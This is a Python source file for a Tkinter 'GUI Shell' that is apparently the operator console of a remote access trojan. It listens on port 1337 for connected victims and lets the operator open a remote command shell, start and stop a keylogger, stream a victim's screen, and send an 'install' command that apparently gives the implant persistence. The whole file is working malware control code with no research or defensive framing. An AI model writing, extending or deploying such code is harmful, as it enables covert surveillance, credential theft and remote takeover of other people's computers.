import socket
import threading
import tkinter as tk
import pyautogui
from vidstream import StreamingServer
from tkinter import Menu, scrolledtext, simpledialog, messagebox

class GUIShell:
    def __init__(self, root):
        self.host = '0.0.0.0'
        self.port = 1337
        self.decoded_data = None
        self.root = root
        self.clients = {}
        self.server_socket = None
        self.lock = threading.Lock()

        self.root.title("GUI Shell")
        self.setup_menu()
        self.setup_client_listbox()

        self.start_server_thread()

    def setup_menu(self):
        self.menu_bar = Menu(self.root)
        self.file_menu = Menu(self.menu_bar, tearoff=0)
        self.file_menu.add_command(label="Change Host IP", command=self.change_host)
        self.file_menu.add_command(label="Change Listener Port", command=self.change_port)
        self.menu_bar.add_cascade(label="Config", menu=self.file_menu)
        self.root.config(menu=self.menu_bar)

    def setup_client_listbox(self):
        self.client_listbox = tk.Listbox(self.root, height=15, width=50)
        self.client_listbox.pack(padx=10, pady=10)
        self.client_menu = Menu(self.root, tearoff=0)
        self.client_menu.add_command(label="Shell", command=self.shell_client)
        self.client_menu.add_command(label="Start Screenshare", command=self.screenshare)
        self.client_menu.add_command(label="Stop Screenshare", command=self.stop_server)
        self.client_menu.add_command(label="Start Keylogger", command=self.keylogger)
        self.client_menu.add_command(label="Stop Keylogger", command=self.keylogger_stop)
        self.client_menu.add_command(label="Install to System", command=self.install)
        self.client_listbox.bind("<Button-3>", self.show_context_menu)

    def install(self):
        conn = self.get_selected_client()
        if conn:
            try:
                conn.send(b"install")
            except socket.error as e:
                print(f"Error sending install command: {e}")

    def keylogger(self):
        conn = self.get_selected_client()
        if conn:
            try:
                threading.Thread(target=self.receive_data, args=(conn, b"keylogger")).start()
            except socket.error as e:
                print(f"Error sending keylogger command: {e}")

    def keylogger_stop(self):
        conn = self.get_selected_client()
        if conn:
            try:
                threading.Thread(target=self.receive_data, args=(conn, b"skey")).start()
            except socket.error as e:
                print(f"Error sending stop keylogger command: {e}")

    def receive_data(self, conn, command):
        try:
            conn.send(command)
            result_output = conn.recv(1024).decode()
            print(result_output)
        except socket.error as e:
            print(f"Error receiving data: {e}")

    def stop_server(self):
        global server
        try:
            server.stop_server()
        except Exception as e:
            print(f"Error stopping server: {e}")

    def start_server_thread(self):
        threading.Thread(target=self.start_server, daemon=True).start()

    def change_port(self):
        new_port = simpledialog.askinteger("Change Port", "Enter new listener port (1024-65535):", minvalue=1024, maxvalue=65535)
        if new_port:
            self.restart_server(new_port=new_port)

    def change_host(self):
        new_host = simpledialog.askstring("Change Host", "Enter new host IP:")
        if new_host:
            self.restart_server(new_host=new_host)

    def restart_server(self, new_port=None, new_host=None):
        with self.lock:
            if self.server_socket:
                self.server_socket.close()
                self.server_socket = None
            if new_port:
                self.port = new_port
            if new_host:
                self.host = new_host
            messagebox.showinfo("Server Restart", f"Host: {self.host}, Port: {self.port}")
            self.start_server_thread()

    def start_server(self):
        with self.lock:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind((self.host, self.port))
                self.server_socket.listen()
                print(f"Server listening on {self.host}:{self.port}")
            except OSError as e:
                print(f"Failed to bind the socket: {e}")
                return

        while True:
            try:
                conn, addr = self.server_socket.accept()
                client_id = f"{addr[0]}:{addr[1]}"
                self.clients[client_id] = conn
                self.client_listbox.insert(tk.END, client_id)
                threading.Thread(target=self.handle_client, args=(conn, client_id), daemon=True).start()
            except OSError as e:
                print(f"Socket error during accept: {e}")
                break

    def screenshare(self):
        conn = self.get_selected_client()
        if conn:
            try:
                conn.send(b"screenshare")
                self.start_screenshare_server()
            except socket.error as e:
                print(f"Error sending screenshare command: {e}")

    def start_screenshare_server(self):
        global server
        try:
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except ImportError:
            print("vidstream module not found...")
        except Exception as e:
            print(f"Failed to start screenshare server: {e}")

    def handle_client(self, conn, client_id):
        try:
            with conn:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    self.decoded_data = data.decode()
                    print(f"Received from {client_id}: {self.decoded_data}")
        finally:
            self.remove_client(client_id)

    def remove_client(self, client_id):
        self.client_listbox.delete(self.client_listbox.get(0, tk.END).index(client_id))
        del self.clients[client_id]

    def show_context_menu(self, event):
        widget = event.widget
        index = widget.nearest(event.y)
        widget.select_clear(0, tk.END)
        widget.select_set(index)
        self.client_menu.post(event.x_root, event.y_root)

    def shell_client(self):
        conn = self.get_selected_client()
        if conn:
            conn.send(b"shell")
            threading.Thread(target=self.shell_interaction, args=(conn,)).start()

    def shell_interaction(self, conn):
        window = tk.Toplevel(self.root)
        window.title("Shell Interaction")

        command_entry = tk.Entry(window, width=50)
        command_entry.pack(pady=10)

        output_text = scrolledtext.ScrolledText(window, width=60, height=20, state='disabled')
        output_text.pack(pady=10)

        clear_button = tk.Button(window, text="Clear", command=lambda: self.clear_output(output_text))
        clear_button.pack(pady=5)

        command_entry.bind("<Return>", lambda event: self.send_shell_command(conn, command_entry, output_text, window))

        def on_close():
            conn.send(b"quit")  
            window.destroy()  

        window.protocol("WM_DELETE_WINDOW", on_close)
        window.mainloop()

    def send_shell_command(self, conn, command_entry, output_text, window):
        command = command_entry.get()
        if command.lower() == "quit":
            conn.send(b"quit")
            window.destroy()
        else:
            conn.send(command.encode())
            self.display_output(conn, output_text)
            command_entry.delete(0, tk.END)

    def display_output(self, conn, output_text):
        try:
            output = conn.recv(1024).decode("UTF-8")
            self.append_output(output_text, output)
            if self.decoded_data:
                self.append_output(output_text, self.decoded_data)
        except OSError as e:
            print(f"Error receiving data: {e}")

    def append_output(self, output_text, output):
        output_text.config(state='normal')
        output_text.insert(tk.END, output + "\n")
        output_text.config(state='disabled')
        output_text.see(tk.END)

    def clear_output(self, output_text):
        output_text.config(state='normal')
        output_text.delete(1.0, tk.END)
        output_text.config(state='disabled')

    def get_selected_client(self):
        selection = self.client_listbox.curselection()
        if selection:
            client_id = self.client_listbox.get(selection[0])
            return self.clients.get(client_id)
        return None

if __name__ == '__main__':
    root = tk.Tk()
    app = GUIShell(root)
    root.mainloop()
